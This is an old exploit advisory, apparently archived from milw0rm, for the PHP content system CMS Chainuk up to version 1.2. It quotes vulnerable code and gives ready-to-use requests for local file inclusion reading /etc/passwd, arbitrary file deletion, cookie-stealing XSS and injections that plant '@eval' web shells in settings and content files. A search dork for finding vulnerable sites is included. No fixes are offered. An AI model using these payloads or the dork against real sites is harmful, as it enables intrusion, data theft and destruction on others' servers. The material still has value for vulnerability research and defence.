<html><head><title>CMS Chainuk <= 1.2 Multiple Remote Vulnerabilities</title></head><pre>CMS Chainuk &lt;= v.1.2 Vulns
Home: Cms.tut.su
Dork: &quot;Cms.tut.su, 2009 g.&quot;

eLwaux(c) 14.06.2


## ## ## ## ## ##

LFI
/index.php
---------------------------------------------------------------------------
6:   if (isset($_GET ['id']))
7:   {
8:   [color=white]$id = $_GET ['id'];[/color]
9:   }
10:  else
11:  {
12:   $id = $index;
13:  }
14:  if (file_exists (&quot;content/&quot; . $id . &quot;.php&quot;))
15:  {
16:   [color=white]include (&quot;content/&quot; . $id . &quot;.php&quot;);[/color]
17:  }
18:  else
19:  {
20:   include ('404.html'); exit;
21:  }
--------------------------------------------------------------------------

exploit:
     index.php?id=../../../../etc/passwd%00


## ## ## ## ## ##

LFI
/admin/admin_edit.php
---------------------------------------------------------------------------
2:   if (isset($_GET['id']))
3:   {
4:   [color=white]$id = $_GET['id'];[/color]
5:   if (!file_exists(&quot;../content/&quot; . $id . &quot;.php&quot;)) die (&quot;..&quot;);
6:   [color=white]include(&quot;../content/&quot; . $id . &quot;.php&quot;);[/color]
23:  }
-----------------------------------------------------------------------------

exploit:
    index.php?id=../../../../etc/passwd%00


## ## ## ## ## ##

delete any files ()
/admin/admin_delete.php[
---------------------------------------------------------------------------
3:  if([color=white]unlink('../content/'.$_GET['id'].'.php')[/color])
4:  {
5:  echo 'Page '.$_GET['id'].' deleted';[/code]
-----------------------------------------------------------------------------

exploit:
   /admin/admin_delete.php?id=../FILE.PHP%00


## ## ## ## ## ##

LFI / XSS / Shell
/admin/admin_menu.php
-----------------------------------------------------------------------------
37:  $menu = explode (',', $_POST['menu']);
38:  $csvcont ='';
39:  foreach ($menu as $a)
40:  {
41:   if (!preg_match(&quot;/[0-9]/&quot;, $a)) die (&quot;error&quot;);
42:   if (!file_exists(&quot;../content/&quot; . $a . &quot;.php&quot;)) die (&quot;error&quot;);
43:   [color=white]include (&quot;../content/&quot; . $a . &quot;.php&quot;);[/color]
44:   $csvcont = $csvcont . $a . &quot;;&quot; . $page_4menu . &quot;\n&quot;;
45:  }
65:  if (!file_put_contents(&quot;../menu.csv&quot;, $csvcont)) ..
-----------------------------------------------------------------------------

exploits:
    LFI POST: menu=../1/../FILE.PHP%00,1,2,3,4,5,6,7
    XSS POST: menu=../1../onmousemove=&quot;javascript:alert(document.cookies)&quot;&gt;&gt;/../index;,1,2,3,4,5,6,7
    Shell: if &lt;asp_tags: On&gt; POST: menu=../1
&lt;asp=@eval(\$_GET[a]);asp&gt;/../admin/passw,1,2,3,4,5,6,7
                                 /?id=../menu.csv%00&amp;a=phpinfo();[/CoDE]


## ## ## ## ## ##

Shell
/admin_settings.php
-----------------------------------------------------------------------------
39:  if (!isset($_POST['tmpl']) || !isset($_POST['id']) ||
!isset($_POST['menu']))
40:  {
41:   die (&quot;...&quot;);
42:  }
43:  if (!file_exists(&quot;../templates/&quot; . $_POST['tmpl'] .
&quot;/index.php&quot;)) die (&quot;...&quot;);
44:  if (!file_exists(&quot;../content/&quot; . $_POST['id'] . &quot;.php&quot;)) die (&quot;...&quot;);
45:  $mtpl = $_POST['menu'];
46:  $set = &quot;&lt;? \$curr_tmpl='&quot; . $_POST['tmpl'] . &quot;'; \$index=&quot;=
$_POST['id'] . &quot;; \$menu_tmpl = \&quot;&quot; . $mtpl . &quot;\&quot;; ?&gt;&quot;;
63:  if (!file_put_contents(&quot;../settings.php&quot;, $set)
-----------------------------------------------------------------------------

exploit:
   POST: action=abc
                tmpl=default
                id=1
                menu=%TITLE%&quot;; @eval($_GET[&quot;a&quot;]); ?&gt; //[/code]
Shell: /settings.php?a=phpinfo();


## ## ## ## ## ##

Shell
/admin_new.php
-----------------------------------------------------------------------------
POST: action=abc
            text=abc
            title='; @eval($_GET[a]); //
            descr=abc
            keys=abc
            link=abc[/code]
/content/=NUMBER.php?a=phpinfo();


## ## ## ## ## ##

Path Disclosure
       /index.php?id=../admin/passw
       /admin/admin_delete.php?id=thisf0ld3risn0texi5s5

# milw0rm.com [2009-07-01]</pre></html>